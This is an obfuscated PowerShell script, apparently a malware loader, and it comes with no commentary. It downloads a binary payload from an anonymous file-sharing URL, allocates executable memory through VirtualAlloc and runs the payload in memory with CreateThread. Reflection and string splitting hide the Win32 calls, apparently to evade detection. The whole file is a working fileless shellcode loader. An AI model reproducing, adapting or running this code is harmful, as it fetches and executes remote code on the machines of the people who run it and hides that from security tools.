$ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
function deadLoader {
    Param ($dead_modules, $dead_func)
    $assem = ([AppDomain]::"cU`R`Re`NTdOMaIn".(('GE'+'T')+('as'+'S')+('EmBLIe'+'S')).Invoke() | ? { $_."GlO`BaLasS`eMBLY`C`AchE" -and $_."lo`Ca`TIoN".('sp'+('L'+'It')).Invoke((('qw'+'IqwI').rEplAcE(([chAr]113+[chAr]119+[chAr]73),[sTriNG][chAr]92)))[-1].('Eq'+('u'+'al')+'S').Invoke(('Syst'+'e'+'m.dll')) }).(('g'+'ET')+'Ty'+'Pe').Invoke(('M'+'icrosoft.Win3'+'2.Uns'+'afeNa'+'tive'+'Metho'+'ds'))
    $tmp = $assem.('gE'+'t'+('METh'+'ODS')).Invoke() | Where-Object { $_."NA`Me" -eq ('Get'+'P'+'rocAddre'+'ss') }
    $handleMethod = $assem.(('getm'+'e')+('tho'+'d')).Invoke(('Ge'+'tModuleHa'+'nd'+'le'))
    $handle = $handleMethod."In`V`OKE"($null, @($dead_modules))
    [IntPtr] $result = 0
    if ($handle -ne $null) {
        $result = $tmp[0]."i`Nv`oKe"($null, @($handle, $dead_func))
    }
    if ($result -eq [IntPtr]::"ZE`RO") {
        $handleRef = [System.Runtime.InteropServices.HandleRef]::('N'+'Ew').Invoke($null, $handle)
        $result = $tmp[0]."In`V`okE"($null, @($handleRef, $dead_func))
    }
    return $result
}
function dead_delegates {
    Param ([Parameter(poSItiOn = 0, manDaTOry = $True)] [Type[]] $func, [Parameter(pOSITion = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::"CurR`eNTDoM`AiN".(('d'+'EfIn')+('Ed'+'yna')+'m'+('iCAssE'+'MBL'+'Y')).Invoke((New-Object System.Reflection.AssemblyName(('R'+'eflect'+'edDelegat'+'e'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"r`UN").('DE'+('finedy'+'nA')+('Micm'+'O')+'dU'+'lE').Invoke(('I'+'nMem'+'oryM'+'od'+'ule'), $false).(('dEF'+'in')+'e'+('Ty'+'pE')).Invoke(('MyD'+'elegateTy'+'p'+'e'), ('Cl'+'as'+'s, P'+'ublic, Se'+'al'+'ed'+', '+'Ansi'+'C'+'lass, AutoClass'), [System.MulticastDelegate])
    $type."d`e`FIneCon`stRu`cTor"(('R'+'TSp'+'ec'+'i'+'al'+'Name, Hid'+'eByS'+'ig, Publi'+'c'), [System.Reflection.CallingConventions]::"StANd`ArD", $func).(('setIMP'+'L')+('em'+'en')+('T'+'ati')+'On'+'F'+('L'+'ag')+'s').Invoke(('Ru'+'ntime, Manag'+'e'+'d'))
    $type.(('d'+'eFin')+'e'+('Met'+'hOD')).Invoke('Invoke', ('P'+'ubl'+'ic,'+' HideB'+'ySig, '+'N'+'ew'+'Slot, Virtu'+'al'), $delType, $func).(('s'+'Et')+'i'+('MP'+'L')+'eM'+('e'+'Ntati'+'Onf')+'La'+'gs').Invoke(('R'+'untime,'+' Mana'+'ged'))
    return $type.(('Cr'+'E')+('at'+'eT')+'y'+'pE').Invoke()
}
$deadthegreat = (iwr -UseBasicParsing "https://anonsharing.com/file/3ac89713415e4713/loader_(2).bin").Content
$lpMem = [System.Runtime.InteropServices.Marshal]::('G'+('Etde'+'Le'+'ga')+('TEFo'+'r')+('fu'+'N')+'c'+('ti'+'Onp')+('OIN'+'T'+'ER')).Invoke((deadLoader kernel32.dll VirtualAlloc), (dead_delegates @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])))."IN`VOke"([IntPtr]::"zE`RO", $deadthegreat."l`EnGTh", 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::('Co'+'pY').Invoke($deadthegreat, 0, $lpMem, $deadthegreat."Le`N`GtH")
$hThread = [System.Runtime.InteropServices.Marshal]::('ge'+('Tde'+'L')+('E'+'gatE')+'Fo'+'R'+('func'+'TI'+'oNp')+'oi'+'NT'+'eR').Invoke((deadLoader kernel32.dll CreateThread), (dead_delegates @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr])))."Invo`Ke"([IntPtr]::"ZE`Ro", 0, $lpMem, [IntPtr]::"ze`Ro", 0, [IntPtr]::"zE`Ro")
[System.Runtime.InteropServices.Marshal]::(('get'+'DELE'+'G')+('at'+'e')+'F'+'oR'+('f'+'unC')+'TI'+('ONP'+'oIn')+('t'+'er')).Invoke((deadLoader kernel32.dll WaitForSingleObject), (dead_delegates @([IntPtr], [Int32])([Int])))."I`NvOKe"($hThread, 0xFFFFFFFF)
